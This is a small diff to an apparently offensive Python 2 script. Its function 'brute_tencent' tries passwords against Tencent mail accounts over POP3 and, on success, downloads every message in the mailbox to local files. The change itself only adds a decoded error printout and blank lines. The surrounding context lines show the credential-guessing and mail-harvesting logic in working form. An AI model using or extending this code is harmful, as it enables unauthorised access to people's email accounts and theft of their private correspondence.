@@ -22,6 +22,7 @@ def brute_tencent(serverName,user, pwd):
     try:
         PopServer.pass_(pwd)
     except Exception as msg:
+        print msg.message.decode('gbk')    
         print ("帐号%s连接失败，密码错误或未开启pop3" %user)
     else:
         print ("帐号%s连接成功，开始下载邮件" %user)
@@ -49,6 +50,8 @@ def downloadEmail(PopServer,user):
             outf.write('\n'.join(PopServer.retr(msg_id)[1])) 
             outf.close() 
     print ("完成，共下载%s封邮件" %count)    
+
+    
 def transFormTime(etime):
     date = {'Jan':1,'Feb':2,'Mar':3,'Apr':4,'May':5,'Jun':6,'Jul':7,'Aug':8,'Sept':9,'Oct':10,'Nov':11,'Dec':12}
     myTime = str(etime[3]) + '-'+ str(date[etime[2]])+'-'+str(etime[1])+ " "+str(etime[4])
